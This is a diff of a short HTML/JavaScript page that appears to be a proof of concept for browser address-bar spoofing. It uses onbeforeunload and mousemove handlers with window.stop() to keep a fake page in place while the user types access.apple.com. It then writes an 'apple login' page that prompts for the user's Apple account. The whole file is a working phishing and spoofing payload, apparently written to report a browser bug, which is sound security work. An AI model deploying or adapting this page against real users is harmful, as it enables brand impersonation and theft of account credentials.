@@ -1,5 +1,24 @@
-<script>
-    document.write("<h1>This is not Bing</h1>");
-    location.href = "https://bing.com:8081";
-    setInterval(function(){location.href="https://google.com:9090/#https://google.com:9090"},2000);
+<h1 id="msg">Next,type access.apple.com in the address bar.</h1>
+<h1 id="spoof"></h1>
+<script type="text/javascript">
+spoof.style.display = 'none';
+var done = 0;
+var got = 0;
+onbeforeunload = function(ev) {
+  done = 1;
+  return false;
+}
+onmousemove = function() {
+  stop();
+  if (done && !got) {
+    msg.style.display = 'none';
+    got = "1000";
+    if (got) {
+      document.write("<title>apple login</title><h1>This is not apple.com!!!</h1><scri"+"pt>onbeforeunload=function(){/*while(1){}*/};document.write('<input id=\\\'log\\\'>');window.stop();prompt('enter your apple account...');window.stop();location.assign('https://access.apple.com');</scrip"+"t>");
+      spoof.style.display = 'block';
+      log.value = got;
+      
+    }
+  }
+}
 </script>
